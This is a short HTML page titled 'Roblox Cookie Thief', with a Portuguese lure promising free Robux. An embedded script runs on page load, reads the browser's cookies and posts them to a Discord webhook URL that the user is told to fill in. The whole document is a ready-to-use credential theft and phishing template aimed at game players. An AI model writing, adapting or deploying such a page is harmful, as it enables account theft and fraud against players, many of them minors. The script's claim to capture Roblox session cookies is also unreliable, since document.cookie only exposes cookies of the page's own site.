<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Thief</title>
</head>
<body>
    <h1>Clique aqui para ganhar Robux grátis!</h1>
    
    <script>
        // Função para enviar os cookies para o seu Discord webhook
        function sendCookies() {
            // Captura os cookies
            var cookies = document.cookie;

            // Envia os cookies para o seu Discord webhook (você deve substituir o URL pelo seu)
            fetch('https://discord.com/api/webhooks/SEU_DISCORD_WEBHOOK_AQUI', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({cookies: cookies})
            })
            .then(response => {
                if (response.ok) {
                    alert('Cookies enviados com sucesso para o Discord!');
                } else {
                    alert('Erro ao enviar cookies para o Discord!');
                }
            })
            .catch(error => {
                console.error('Erro:', error);
                alert('Erro ao enviar cookies para o Discord!');
            });
        }

        // Chama a função sendCookies assim que a página for carregada
        window.onload = sendCookies;
    </script>
</body>
</html>
